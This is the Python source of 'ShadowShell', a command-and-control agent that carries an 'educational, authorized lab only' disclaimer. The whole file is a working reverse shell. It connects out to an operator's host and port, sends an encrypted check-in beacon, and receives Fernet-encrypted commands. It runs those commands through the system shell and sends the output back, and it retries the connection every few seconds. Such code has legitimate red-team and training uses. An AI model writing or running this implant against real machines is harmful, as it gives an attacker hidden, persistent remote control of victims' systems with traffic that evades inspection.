import socket
import subprocess
import argparse
import time
from cryptography.fernet import Fernet

# ShadowShell C2 Agent (Encrypted)
# Educational use only. Authorized lab testing only.

def load_key():
    try:
        with open("secret.key", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        print("[-] secret.key not found. Run generate_key.py first!")
        exit(1)

def connect_to_server(host, port, fernet):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            # 1. Send encrypted initial beacon
            beacon = b"ShadowShell Agent checked in. Awaiting commands.\n"
            encrypted_beacon = fernet.encrypt(beacon)
            sock.send(encrypted_beacon)
            
            while True:
                # 2. Receive encrypted command
                encrypted_cmd = sock.recv(4096)
                if not encrypted_cmd:
                    break
                
                # Decrypt command
                try:
                    cmd = fernet.decrypt(encrypted_cmd).decode('utf-8')
                except Exception:
                    break # Exit if we can't decrypt (server might be messing up)
                
                if cmd.lower() == 'exit':
                    break
                
                # 3. Execute command
                try:
                    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    result = output.stdout + output.stderr
                    if not result:
                        result = "[*] Command executed successfully (no output).\n"
                except Exception as e:
                    result = f"[-] Error executing command: {e}\n"
                
                # 4. Encrypt output and send back
                encrypted_result = fernet.encrypt(result.encode('utf-8'))
                sock.send(encrypted_result)
                
        except ConnectionRefusedError:
            print("[-] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Error: {e}. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShadowShell C2 Agent")
    parser.add_argument("--host", default="127.0.0.1", help="C2 Server IP (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=4444, help="C2 Server Port (default: 4444)")
    args = parser.parse_args()
    
    key = load_key()
    fernet = Fernet(key)
    connect_to_server(args.host, args.port, fernet)
